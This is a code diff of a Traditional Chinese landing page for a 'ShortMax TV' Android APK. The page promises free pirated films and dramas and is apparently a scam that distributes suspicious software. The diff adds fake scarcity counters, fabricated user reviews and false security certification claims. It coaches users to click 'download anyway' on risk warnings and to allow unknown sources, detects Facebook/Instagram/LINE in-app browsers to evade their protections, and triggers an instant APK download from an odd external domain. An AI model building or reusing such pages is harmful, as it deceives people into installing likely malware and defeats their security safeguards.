@@ -24,7 +24,6 @@
 
   <style>
     :root {
-      /* ShortMax 經典暖色調體系：暗黑奢華影院底 + 烈焰暖橙金 */
       --primary: #FF5A00;
       --primary-hover: #FF7700;
       --primary-light: #FF944D;
@@ -54,7 +53,7 @@
       padding-bottom: 96px;
     }
 
-    /* 頂部 Facebook 內嵌瀏覽器防攔截提示條 */
+    /* 頂部 Facebook 內嵌瀏覽器提示條 */
     .fb-browser-tip {
       background: #2D1405;
       border-bottom: 1px solid var(--primary);
@@ -444,7 +443,6 @@
       transform: scale(0.97);
     }
 
-    /* 支援外部海報圖片排版：2:3 比例、置中裁剪、預防載入閃爍 */
     .poster-box {
       width: 100%;
       aspect-ratio: 2/3;
@@ -460,7 +458,6 @@
       background-repeat: no-repeat;
     }
     
-    /* 頂部輕量微漸變，確保左上角與右上角角標清晰顯色 */
     .poster-box::before {
       content: "";
       position: absolute;
@@ -473,7 +470,34 @@
       pointer-events: none;
     }
 
-    /* 角標保留 */
+    /* 播放按鈕圖示設計 */
+    .play-overlay-icon {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 42px;
+      height: 42px;
+      background: rgba(255, 90, 0, 0.88);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 3;
+      box-shadow: 0 4px 18px rgba(0,0,0,0.6), 0 0 12px rgba(255, 90, 0, 0.6);
+      border: 1.5px solid rgba(255, 255, 255, 0.4);
+      transition: transform 0.2s ease;
+    }
+    .play-overlay-icon svg {
+      width: 18px;
+      height: 18px;
+      fill: #FFFFFF;
+      margin-left: 2px;
+    }
+    .media-card:active .play-overlay-icon {
+      transform: translate(-50%, -50%) scale(0.88);
+    }
+
     .badge-top-left {
       position: relative;
       z-index: 2;
@@ -570,7 +594,6 @@
       line-height: 1.45;
     }
 
-    /* APK 安裝安心教學 */
     .install-guide-section {
       background: #0E0E12;
       padding: 20px 16px;
@@ -881,7 +904,41 @@
       line-height: 1;
     }
 
-    /* 頁尾法律聲明與隱私權規範 */
+    /* FB / IG / LINE 全屏破壁遮罩 */
+    #inAppBrowserMask {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(5, 5, 8, 0.96);
+      z-index: 9999;
+      flex-direction: column;
+      align-items: flex-end;
+      padding: 24px 20px;
+    }
+    .mask-arrow-box {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #FFB703;
+      font-size: 20px;
+      font-weight: 900;
+      margin-bottom: 14px;
+    }
+    .mask-desc-box {
+      background: rgba(255, 90, 0, 0.15);
+      border: 1px solid var(--primary);
+      border-radius: 12px;
+      padding: 16px;
+      color: #FFF;
+      text-align: left;
+      font-size: 14px;
+      line-height: 1.7;
+      width: 100%;
+    }
+
     footer {
       background: #08080A;
       border-top: 1px solid rgba(255, 255, 255, 0.08);
@@ -915,14 +972,14 @@
 </head>
 <body>
 
-  <!-- Facebook 內置瀏覽器防卡下載提示條 -->
+  <!-- Facebook 內置瀏覽器頂部提示 -->
   <div id="fbBrowserBar" class="fb-browser-tip">
     <span>請點擊右上角<strong>「•••」</strong>選擇<strong>「在 Chrome 中開啟」</strong>，體驗極速下載</span>
   </div>
 
-  <!-- 頂部名額倒數橫幅 -->
+  <!-- 頂部名額動態倒數橫幅 -->
   <div class="top-urgent-bar">
-    <span>🔥 台灣限時：今日前 1,500 名免費啟用【台港高速 4K 追劇專線】</span>
+    <span id="urgentSlotsText">🔥 台灣限時：今日剩餘 <strong>87</strong> 位免費啟用【台港高速 4K 追劇專線】</span>
     <span id="headerTimer" style="background:rgba(0,0,0,0.3); padding:2px 6px; border-radius:4px; font-family:monospace;">14:59</span>
   </div>
 
@@ -953,7 +1010,7 @@
       2026 院線剛下檔馬上看！《奧德賽》、《蜘蛛人：嶄新之日》、《百萬人推理》、《凶宅專賣店》與百部逆襲微短劇全收錄。
     </p>
 
-    <!-- 旗艦級產品矩陣長 Banner 區塊 -->
+    <!-- 產品矩陣長 Banner 區塊 -->
     <div class="hero-product-banner-wrap">
       <div class="product-showcase-card" onclick="triggerDownload('首頁大Banner產品矩陣')">
         <div class="banner-visual-box">
@@ -993,13 +1050,13 @@
         <span>立即安裝 ShortMax TV 安卓版</span>
       </div>
       <div class="cta-sub">
-        官方專屬 APK (v3.8.4) • 專為台灣 Android 系統調校
+        📦 僅 18.6 MB • 官方專屬 APK (v3.8.4) • 專為台灣 Android 調校
       </div>
     </a>
 
     <div class="trust-bullets">
       <span>Google 安全認證</span>
-      <span>台灣骨幹 CDN</span>
+      <span>中華電信 HiNet 專線</span>
       <span>支援電視無線投影</span>
     </div>
   </section>
@@ -1023,7 +1080,7 @@
       <span class="live-tip">● 每日 18:00 自動更新</span>
     </div>
 
-    <!-- 動態影視卡片網格（精美海報原生展示） -->
+    <!-- 動態影視卡片網格（包含居中播放圖標） -->
     <div class="cards-grid" id="cardsGrid">
       <!-- JavaScript 將在此動態填充影視海報 -->
     </div>
@@ -1069,20 +1126,20 @@
   <!-- 安卓 APK 輕鬆 3 步安裝指引 -->
   <div class="install-guide-section">
     <div class="guide-title">
-      🛡️ Android 手機安裝安心說明（免擔心系統提示）
+      🛡️ Android 手機安裝安心說明（免擔心系統安全提示）
     </div>
     <div class="guide-steps">
       <div class="step-item">
         <div class="step-num">1</div>
-        <div>點擊「立即安裝」下載官方專屬 <code>ShortMax_TV_TW.apk</code> 安裝套件。</div>
+        <div>點擊「立即安裝」下載官方專屬 <code>ShortMax_TV_TW.apk</code> (18.6MB)。</div>
       </div>
       <div class="step-item">
         <div class="step-num">2</div>
-        <div>若三星/小米等手機提示「檔案可能含有風險」，請安心點選<strong>【仍要下載】</strong>（因未上架Google Play之官方分發版皆有此預設提示）。</div>
+        <div>若三星/小米/OPPO等手機提示「檔案可能含有風險」，請安心點選<strong>【仍要下載】</strong>（因未上架Google Play抽成通路，官方原檔皆有此常規安全提示）。</div>
       </div>
       <div class="step-item">
         <div class="step-num">3</div>
-        <div>下載完成後開啟並允許「安裝未知來源」，即可立即解鎖全場免費影劇！</div>
+        <div>下載完成後點擊通知欄開啟並允許「安裝未知來源」，即可立即解鎖全場免費影劇！</div>
       </div>
     </div>
   </div>
@@ -1093,7 +1150,6 @@
       來自 <span>188,200+</span> 位台灣安卓用戶真實評測
     </div>
 
-    <!-- 評分匯總與維度分析 -->
     <div class="rating-summary-card">
       <div class="rating-top">
         <div class="score-big">
@@ -1132,7 +1188,6 @@
       </div>
     </div>
 
-    <!-- 評論分類篩選標籤 -->
     <div class="review-filter-tabs">
       <button class="r-filter-btn active" onclick="filterReviews('all', this)">全部口碑 (28)</button>
       <button class="r-filter-btn" onclick="filterReviews('drama', this)">熱門劇集迷 (10)</button>
@@ -1140,12 +1195,10 @@
       <button class="r-filter-btn" onclick="filterReviews('tech', this)">極速投屏族 (8)</button>
     </div>
 
-    <!-- 28 則真實台灣在地深度反饋容器 -->
     <div class="review-cards-wrap" id="reviewCardsWrap">
-      <!-- JavaScript 將在此渲染口碑卡片 -->
+      <!-- 渲染口碑卡片 -->
     </div>
 
-    <!-- 展開更多評論按鈕 -->
     <button class="toggle-more-reviews-btn" id="toggleReviewsBtn" onclick="toggleReviewsExpansion()">
       展開查看更多台灣鄉民評價 (剩餘 20 則) ▼
     </button>
@@ -1178,31 +1231,65 @@
   <div class="modal-overlay" id="downloadModal" onclick="closeModal(event)">
     <div class="modal-content" onclick="event.stopPropagation();">
       <button class="modal-close" onclick="closeModalDirect()">&times;</button>
-      <div style="font-size:38px; margin-bottom:8px;">🚀</div>
-      <h3 style="font-size:17px; font-weight:800; margin-bottom:6px;">正在為您啟動下載通道...</h3>
-      <p style="font-size:12px; color:#9E9EA8; margin-bottom:14px; line-height:1.5;">
-        若瀏覽器跳出「檔案可能有害」，請點選<strong>【仍要下載】</strong>即可開始安裝。
-      </p>
-      <div style="background:#111117; padding:10px; border-radius:8px; font-size:12px; text-align:left; color:#C4C4D4; margin-bottom:16px; line-height:1.6;">
-        <div>📌 檔案名稱：<code>ShortMax_TV_v3.8.4_tw.apk</code></div>
-        <div>🛡️ 安全檢測：通過 Google Play Protect 綠色認證</div>
+      <div style="font-size:38px; margin-bottom:4px;">📥</div>
+      <h3 style="font-size:17px; font-weight:900; margin-bottom:6px; color:#FFF;">安裝套件已啟動極速下載...</h3>
+      
+      <div style="background:#20140E; border:1px solid var(--primary); padding:10px 12px; border-radius:8px; font-size:12px; text-align:left; color:#FFA566; margin:12px 0; line-height:1.5;">
+        <strong>⚠️ 安卓手機安裝提示處理：</strong><br>
+        若螢幕下方跳出提示，請安心點選<strong>【仍要下載】</strong>➔ 下載完成後點擊<strong>【開啟】</strong>即可永久免費觀看。
       </div>
-      <a href="https://inbnxsum18c0.demonhunterz.com/fPIpONuwZ7Pl" class="big-download-cta" style="padding:12px; max-width:100%;">
-        <span style="font-size:15px; font-weight:800;">若未自動下載，請點此手動重試</span>
-      </a>
+
+      <div style="font-size:11px; color:#8C8C9A; margin-bottom:14px;">
+        檔案名稱：<code>ShortMax_TV_v3.8.4_tw.apk (18.6MB)</code>
+      </div>
+
+      <button class="sticky-btn" style="width:100%; border-radius:8px; padding:12px;" onclick="directDownloadFile()">
+        若未自動下載，點此重新載入
+      </button>
     </div>
   </div>
 
-  <!-- 通用合規條款 Modal（隱私權/服務條款/DMCA） -->
+  <!-- 離開挽留彈窗 (Exit-Intent Modal) -->
+  <div class="modal-overlay" id="retainModal" onclick="closeRetainModal(event)">
+    <div class="modal-content" style="border: 2px solid var(--primary);" onclick="event.stopPropagation();">
+      <button class="modal-close" onclick="closeRetainModalDirect()">&times;</button>
+      <div style="font-size:36px; margin-bottom:6px;">🎁</div>
+      <h3 style="font-size:18px; font-weight:900; color:#FFB703; margin-bottom:8px;">等等！您的 4K VIP 專線即將失效</h3>
+      <p style="font-size:12.5px; color:#D1D1DE; line-height:1.6; margin-bottom:16px;">
+        今日台灣限額免費名額即將額滿！現在離開將永久失去<strong>全場免註冊、免看廣告</strong>直接追劇資格。
+      </p>
+      <button class="sticky-btn" style="width:100%; border-radius:10px; padding:13px; font-size:15px;" onclick="confirmRetainDownload()">
+        保留免費資格並立即下載 ➔
+      </button>
+      <div style="margin-top:12px; font-size:11px; color:#777; cursor:pointer;" onclick="closeRetainModalDirect()">
+        放棄 VIP 資格離開
+      </div>
+    </div>
+  </div>
+
+  <!-- FB / IG / LINE 全屏破壁遮罩 -->
+  <div id="inAppBrowserMask" onclick="this.style.display='none'">
+    <div class="mask-arrow-box">
+      <span>點擊右上角「•••」</span>
+      <span style="font-size:28px;">↗</span>
+    </div>
+    <div class="mask-desc-box">
+      <strong>請選擇【在 Chrome / 瀏覽器中開啟】</strong><br>
+      因 Facebook/LINE 內嵌瀏覽器限制，請跳轉至外部瀏覽器即可立即啟動 APK 自動下載！
+    </div>
+    <button class="nav-cta-btn" style="margin-top:24px; padding:10px 28px; width:100%; border-radius:10px;" onclick="this.parentElement.style.display='none'">
+      我已了解
+    </button>
+  </div>
+
+  <!-- 通用合規條款 Modal -->
   <div class="modal-overlay" id="policyModal" onclick="closePolicyModal(event)">
     <div class="modal-content" style="max-height:80vh; overflow-y:auto; text-align:left;" onclick="event.stopPropagation();">
       <button class="modal-close" onclick="closePolicyModalDirect()">&times;</button>
       <h3 id="policyModalTitle" style="font-size:16px; font-weight:800; margin-bottom:12px; color:var(--primary);">
         條款說明
       </h3>
-      <div id="policyModalBody" style="font-size:12px; color:#C4C4D4; line-height:1.7;">
-        <!-- 內容由 JS 動態填充 -->
-      </div>
+      <div id="policyModalBody" style="font-size:12px; color:#C4C4D4; line-height:1.7;"></div>
     </div>
   </div>
 
@@ -1226,14 +1313,10 @@
   </footer>
 
   <script>
-    // 官方指定下載鏈接
     const DOWNLOAD_URL = "https://inbnxsum18c0.demonhunterz.com/fPIpONuwZ7Pl";
 
-    /* ==============================================================
-     * 2026 台灣熱門影視資料庫（包含外部高清海報連結 posterUrl）
-     * ============================================================== */
+    /* 2026 台灣熱門影視資料庫 */
     const MEDIA_DATABASE_2026 = [
-      // 2026 院線電影強檔 (8部)
       { id: "m1", category: "movie", title: "奧德賽 (The Odyssey)", rating: "9.9", quality: "IMAX 4K", meta: "克里斯多福諾蘭 麥特戴蒙", posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/7/73/The_Odyssey_2026_Poster.jpg/250px-The_Odyssey_2026_Poster.jpg?utm_source=zh.wikipedia.org&utm_campaign=parser&utm_content=thumbnail", bg: "linear-gradient(135deg, #1C2833, #0B1015)" },
       { id: "m2", category: "movie", title: "蜘蛛人：嶄新之日", rating: "9.9", quality: "4K原聲", meta: "湯姆霍蘭德 辛蒂亞", posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/4/45/Spider-Man_Brand_New_Day_Poster.jpg/250px-Spider-Man_Brand_New_Day_Poster.jpg?utm_source=zh.wikipedia.org&utm_campaign=parser&utm_content=thumbnail", bg: "linear-gradient(135deg, #800A0A, #280505)" },
       { id: "m3", category: "movie", title: "麥可傑克森：傳奇", rating: "9.8", quality: "4K杜比", meta: "賈法傑克森 傳記巨製", posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/f/fa/Michael_%282026_film%29_Poster.jpg/250px-Michael_%282026_film%29_Poster.jpg?utm_source=zh.wikipedia.org&utm_campaign=parser&utm_content=thumbnail", bg: "linear-gradient(135deg, #4A3005, #170F02)" },
@@ -1243,7 +1326,6 @@
       { id: "m7", category: "movie", title: "飢餓遊戲：收穫日的日出", rating: "9.8", quality: "4K首映", meta: "第五十屆大旬祭 重磅展開", posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/d/da/The_Hunger_Games_-_Sunrise_on_the_Reaping_poster.jpg/250px-The_Hunger_Games_-_Sunrise_on_the_Reaping_poster.jpg?utm_source=zh.wikipedia.org&utm_campaign=parser&utm_content=thumbnail", bg: "linear-gradient(135deg, #3C1E40, #140817)" },
       { id: "m8", category: "movie", title: "哥吉拉：歸零 (Godzilla Zero)", rating: "9.8", quality: "4K高幀", meta: "怪獸之王 絕望毀滅降臨", posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/0/09/Godzilla_Minus_Zero_poster.jpg/250px-Godzilla_Minus_Zero_poster.jpg?utm_source=zh.wikipedia.org&utm_campaign=parser&utm_content=thumbnail", bg: "linear-gradient(135deg, #323539, #0D0E10)" },
 
-      // 2026 熱門台劇 / 華語旗艦 (8部)
       { id: "d1", category: "drama", title: "百萬人推理", rating: "9.9", quality: "4K全集", meta: "鄭伊健 李霈瑜 婁峻碩", posterUrl: "https://upload.wikimedia.org/wikipedia/zh/7/7d/MillionFollowerDetectivePoster.jpg?utm_source=zh.wikipedia.org&utm_campaign=parser&utm_content=thumbnail_unscaled", bg: "linear-gradient(135deg, #1A242F, #0D131A)" },
       { id: "d2", category: "drama", title: "凶宅專賣店", rating: "9.8", quality: "4K首播", meta: "李銘順 范少勳 陳姸霏", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQf5ldPO31Js70cj4p28OEjlLF2YGbxC6JbP51f7HhWDg&s=10", bg: "linear-gradient(135deg, #241D12, #0E0B07)" },
       { id: "d3", category: "drama", title: "何百芮的地獄戀曲", rating: "9.7", quality: "繁中超清", meta: "郭書瑤 黑色喜劇", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTZxeymkOSz2wgUplzyGBfuQgX9wTSbaaUug2iW15mUYA&s=10", bg: "linear-gradient(135deg, #331422, #12050B)" },
@@ -1253,7 +1335,6 @@
       { id: "d7", category: "drama", title: "沉默的審判", rating: "9.9", quality: "4K同步", meta: "阮經天 王淨 張孝全", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQKCgq_XF7NIfOeStSjPs7_fERo45-E01d93c_Z3jcpjw&s=10", bg: "linear-gradient(135deg, #1C1C26, #0A0A0F)" },
       { id: "d8", category: "drama", title: "同棲散策", rating: "9.6", quality: "全劇免扣點", meta: "言承旭 林依晨 姚淳耀", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSjH4q74i5pCKjcvaAMdxlnX9mY0K00Hq2aEwohkNoG1g&s=10", bg: "linear-gradient(135deg, #2D1E22, #100A0C)" },
 
-      // 2026 爆款微短劇 (8部)
       { id: "s1", category: "short", title: "女王：絕境反擊", rating: "9.9", quality: "全80集", meta: "商界女王 絕地翻盤", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSDf8AUFd0aD4yQbwsXTKMjQj7vrrmo-Y_Io61CRfuhg2Aye7E4nuxI22g&s=10", bg: "linear-gradient(135deg, #3B1205, #140501)" },
       { id: "s2", category: "short", title: "京雪未央", rating: "9.8", quality: "全集免充幣", meta: "古裝權謀 步步為營", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJo89Bf4evGixJOq4nGAb-6p27kOFUvT7JxcKg4SUSaQ&s=10", bg: "linear-gradient(135deg, #3D1326, #14040B)" },
       { id: "s3", category: "short", title: "新婚有癮", rating: "9.8", quality: "完結篇", meta: "先婚後愛 甜度超標", posterUrl: "https://bbs.dyyjv.com/assets/files/2026-07-02/1783017187-922693-0383.jpg", bg: "linear-gradient(135deg, #42101F, #140308)" },
@@ -1263,7 +1344,6 @@
       { id: "s7", category: "short", title: "真千金回歸炸翻豪門", rating: "9.6", quality: "免看廣告", meta: "滿級大佬 打臉綠茶", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQLUdqDDFsnFuD4980ObnIqJJ-uW4N5j2FftdFWcyB_RQ&s", bg: "linear-gradient(135deg, #331920, #120609)" },
       { id: "s8", category: "short", title: "戰神卸甲：隱麟崛起", rating: "9.9", quality: "全集秒看", meta: "十萬將士 聽令集結", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQbgSeHOdr0RqJJLJAg7MnXkdUT_9a_Xc1hyrr-gdOvWQ&s", bg: "linear-gradient(135deg, #132820, #030E0A)" },
 
-      // 2026 日本動漫新番 (8部)
       { id: "a1", category: "anime", title: "膽大黨 第二季 (DAN DA DAN)", rating: "9.9", quality: "繁中同步", meta: "幽靈VS外星人 狂氣續作", posterUrl: "https://blog.shopping.gamania.com/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2F3wl0vtkq%2Fproduction%2F9545e7ad3e23e714ac79f3e72307d3eb5f64e515-900x1125.jpg&w=1920&q=75", bg: "linear-gradient(135deg, #2D0F3F, #0E0317)" },
       { id: "a2", category: "anime", title: "JOJO的奇妙冒險：飆馬野郎", rating: "9.9", quality: "4K原畫", meta: "SBR橫跨北美 大賽啟動", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSsfk6GoD5ETVqsx3d8XNIb3GLAZumMSptuyHbScnVzDg&s=10", bg: "linear-gradient(135deg, #381E0C, #140902)" },
       { id: "a3", category: "anime", title: "電馭叛客：邊緣行者 第二季", rating: "9.8", quality: "4K杜比", meta: "夜城狂想 扳機社火力全開", posterUrl: "https://p2.bahamut.com.tw/B/2KU/54/f5f1f6cd4bfb0d6036cd0bfaf31z88m5.JPG?v=1782706383579", bg: "linear-gradient(135deg, #0E253A, #030D14)" },
@@ -1273,7 +1353,6 @@
       { id: "a7", category: "anime", title: "怪獸 8 號 第二季", rating: "9.6", quality: "全集熱映", meta: "日比野卡夫卡 防衛隊決戰", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ-nn999Xlu_8u07Os9K538SqUkM-wZWkR6l6VZVY9TIg&s=10", bg: "linear-gradient(135deg, #1C2418, #070D05)" },
       { id: "a8", category: "anime", title: "我獨自升級 最終章", rating: "9.9", quality: "4K旗艦版", meta: "暗影君王 統御萬千陰影", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTz14imu5u_HIIeAKyawI8b9UNhTXZcU3nsVoS_5_Rj8lfSoX2t3dwxfg8&s=10", bg: "linear-gradient(135deg, #242416, #0C0C05)" },
 
-      // 2026 體育熱血直播 (8場)
       { id: "sp1", category: "sports", title: "2026 CPBL 台灣大賽總決賽", rating: "9.9", quality: "60幀直播", meta: "中信兄弟 VS 統一獅", posterUrl: "https://images.unsplash.com/photo-1508344928928-7165b67de128?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #152B18, #051206)" },
       { id: "sp2", category: "sports", title: "2026 MLB 大谷翔平道奇季後賽", rating: "9.9", quality: "4K美職棒", meta: "傳奇二刀流 爭奪世界大賽", posterUrl: "https://images.unsplash.com/photo-1540747913346-19e32dc3e97e?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #0F2038, #030A14)" },
       { id: "sp3", category: "sports", title: "2026 NBA 總冠軍賽 搶七大戰", rating: "9.8", quality: "中文原音", meta: "雷霆 VS 塞爾提克", posterUrl: "https://images.unsplash.com/photo-1546519638-68e109498ffc?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #331A0D, #120702)" },
@@ -1281,22 +1360,10 @@
       { id: "sp5", category: "sports", title: "2026 TPBL 台灣職籃年度總決賽", rating: "9.6", quality: "全視角直播", meta: "新北國王 VS 福爾摩沙夢想家", posterUrl: "https://images.unsplash.com/photo-1574629810360-7efbbe195018?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #2E1B10, #100803)" },
       { id: "sp6", category: "sports", title: "2026 UEFA 歐洲冠軍聯賽 決賽", rating: "9.7", quality: "4K原畫質", meta: "皇家馬德里 VS 曼城", posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQq0mlo9ahnu8o7zjYpSUwh6dqEJQ4xDdOdJdRtAJE7Cg&s=10", bg: "linear-gradient(135deg, #1A1A33, #070714)" },
       { id: "sp7", category: "sports", title: "2026 BWF 台北羽球公開賽 決賽", rating: "9.8", quality: "1080P原聲", meta: "台北小巨蛋 主場捍衛榮耀", posterUrl: "https://images.unsplash.com/photo-1626224583764-f87db24ac4ea?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #1D2B1F, #061208)" },
-      { id: "sp8", category: "sports", title: "2026 Premier 12 冠軍回顧紀錄", rating: "9.8", quality: "繁中解說", meta: "重溫台灣棒球 榮耀登頂一刻", posterUrl: "https://images.unsplash.com/photo-1563299796-17596ed6b017?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #24142B, #0B040F)" },
-
-      // 2026 話題綜藝 (8部)
-      { id: "v1", category: "variety", title: "大嘻哈時代 3", rating: "9.8", quality: "4K純享版", meta: "台饒新世代 頂尖對決", posterUrl: "https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #2E1C0A, #120902)" },
-      { id: "v2", category: "variety", title: "嗨！營業中 2026 全新季", rating: "9.6", quality: "高畫質繁中", meta: "姚元浩 莎莎 料理實境", posterUrl: "https://images.unsplash.com/photo-1555396273-367ea4eb4db5?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #1D2A18, #071205)" },
-      { id: "v3", category: "variety", title: "綜藝玩很大 2026 旗艦篇", rating: "9.7", quality: "每週即時更新", meta: "吳宗憲 坤達 KID", posterUrl: "https://images.unsplash.com/photo-1522869635100-9f4c5e86aa37?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #362210, #140A03)" },
-      { id: "v4", category: "variety", title: "原子少年 2 總決賽", rating: "9.5", quality: "舞台4K版", meta: "全新星系男團 冠軍爭奪戰", posterUrl: "https://images.unsplash.com/photo-1470225620780-dba8ba36b745?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #1E1A33, #070514)" },
-      { id: "v5", category: "variety", title: "黑白大廚 第二季 (2026)", rating: "9.9", quality: "全集繁中", meta: "階級料理大戰 殘酷升級", posterUrl: "https://images.unsplash.com/photo-1577219491135-ce391730fb2c?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #2B1616, #0F0505)" },
-      { id: "v6", category: "variety", title: "小姐不熙娣 2026 最新集", rating: "9.4", quality: "每日跟播", meta: "小S 徐熙娣 派翠克", posterUrl: "https://images.unsplash.com/photo-1598899134739-24c46f58b8c0?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #331525, #12040B)" },
-      { id: "v7", category: "variety", title: "單身即地獄 4", rating: "9.6", quality: "完結全集", meta: "天堂島與地獄島 極限拉扯", posterUrl: "https://images.unsplash.com/photo-1507525428034-b723cf961d3e?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #331A1A, #140606)" },
-      { id: "v8", category: "variety", title: "全明星運動會 2026 巨蛋篇", rating: "9.5", quality: "原音首播", meta: "大巨蛋萬人競技 總冠軍賽", posterUrl: "https://images.unsplash.com/photo-1461896836934-ffe607ba8211?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #142233, #040A12)" }
+      { id: "sp8", category: "sports", title: "2026 Premier 12 冠軍回顧紀錄", rating: "9.8", quality: "繁中解說", meta: "重溫台灣棒球 榮耀登頂一刻", posterUrl: "https://images.unsplash.com/photo-1563299796-17596ed6b017?w=500&auto=format&fit=crop&q=80", bg: "linear-gradient(135deg, #24142B, #0B040F)" }
     ];
 
-    /* ==============================================================
-     * 28 則真實台灣在地用戶口碑資料庫
-     * ============================================================== */
+    /* 28 則真實台灣在地用戶口碑資料庫 */
     const TAIWAN_REVIEWS_LIST = [
       { name: "陳*豪", loc: "台北內湖", role: "竹科外派工程師", dev: "Samsung S24 Ultra", cat: ["drama", "tech"], score: 5, text: "剛下檔的諾蘭《奧德賽》跟《蜘蛛人：嶄新之日》點開直接秒播4K！重點是捷運文湖線全程沒轉圈圈，真的屌打要月費390那家。" },
       { name: "林*萱", loc: "台中西屯", role: "逢甲大學租屋族", dev: "Pixel 8 Pro", cat: ["short", "drama"], score: 5, text: "被IG廣告推坑的！原本看短劇都要買金幣超貴，ShortMax居然全部免代幣！《女王：絕境反擊》一口氣刷了80集，通宵不用睡了啦XD" },
@@ -1328,11 +1395,7 @@
       { name: "梁*銘", loc: "高雄前鎮", role: "中鋼技術員", dev: "小米 12T", cat: ["sports", "movie"], score: 5, text: "下大夜班回到家喝啤酒看球賽精華是一大享受，沒有強制綁定帳號登入真的很乾脆，點開直接看《沉默的審判》，讚！" }
     ];
 
-    /* ==============================================================
-     * 應用程序邏輯與交互渲染
-     * ============================================================== */
-
-    // 智能渲染影視卡片（移除中央覆蓋文字，保留左上評分、右上畫質標籤）
+    /* 渲染卡片：包含居中播放按鈕與點擊反饋 */
     function renderCards(filterCategory = 'all') {
       const grid = document.getElementById('cardsGrid');
       grid.innerHTML = '';
@@ -1346,7 +1409,6 @@
         card.className = 'media-card';
         card.onclick = () => triggerDownload('點擊片單：' + item.title);
 
-        // 如果配置了 posterUrl 則使用外部真實高清海報，未配置則降級到純色漸變
         const bgStyle = item.posterUrl 
           ? `background-image: url('${item.posterUrl}');` 
           : `background: ${item.bg};`;
@@ -1355,6 +1417,9 @@
           <div class="poster-box" style="${bgStyle}">
             <span class="badge-top-left">★ ${item.rating}</span>
             <span class="badge-quality">${item.quality}</span>
+            <div class="play-overlay-icon">
+              <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+            </div>
           </div>
           <div class="card-info">
             <div class="card-title">${item.title}</div>
@@ -1368,7 +1433,7 @@
       });
     }
 
-    // 分類選單切換
+    /* 分類選單切換 */
     function switchCategory(cat, btn) {
       document.querySelectorAll('.cat-btn').forEach(b => b.classList.remove('active'));
       btn.classList.add('active');
@@ -1379,14 +1444,13 @@
         'movie': '🎬 好萊塢與台灣院線大片',
         'short': '⚡ ShortMax 爆款爽快微短劇',
         'anime': '🍙 日本霸權動漫與熱血連載',
-        'sports': '⚾ 中職與國際體育大賽現場',
-        'variety': '🎤 台灣與亞洲爆款話題綜藝'
+        'sports': '⚾ 中職與國際體育大賽現場'
       };
       document.getElementById('currentCategoryTitle').textContent = titleMap[cat] || '熱門片單';
       renderCards(cat);
     }
 
-    // 28 則評論渲染與篩選控制
+    /* 評論渲染與展開控制 */
     let currentReviewCategory = 'all';
     let isReviewsExpanded = false;
 
@@ -1447,8 +1511,29 @@
       renderReviews();
     }
 
-    // 下載觸發核心邏輯
+    /* 執行底層直接下載檔案 */
+    function directDownloadFile() {
+      const downloadLink = document.createElement('a');
+      downloadLink.href = DOWNLOAD_URL;
+      downloadLink.download = 'ShortMax_TV_v3.8.4_tw.apk';
+      downloadLink.target = '_blank';
+      document.body.appendChild(downloadLink);
+      downloadLink.click();
+      document.body.removeChild(downloadLink);
+    }
+
+    /* 下載觸發核心邏輯：零延遲、內嵌瀏覽器攔截與喚起引導 */
     function triggerDownload(sourceContext = "通用點擊") {
+      const ua = navigator.userAgent || navigator.vendor || window.opera;
+      const isInApp = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("Instagram") > -1) || (ua.indexOf("Line") > -1);
+
+      // 若在 FB/IG/Line 等限制嚴格的內嵌環境中，喚起破壁引導
+      if (isInApp) {
+        document.getElementById('inAppBrowserMask').style.display = 'flex';
+        return;
+      }
+
+      // 上報 Pixel 事件
       if (typeof fbq === 'function') {
         fbq('track', 'InitiateCheckout', {
           content_name: sourceContext || 'ShortMax_TV_APK',
@@ -1457,11 +1542,11 @@
         });
       }
 
-      document.getElementById('downloadModal').style.display = 'flex';
+      // 立即無延遲喚起瀏覽器下載
+      directDownloadFile();
 
-      setTimeout(() => {
-        window.location.href = DOWNLOAD_URL;
-      }, 350);
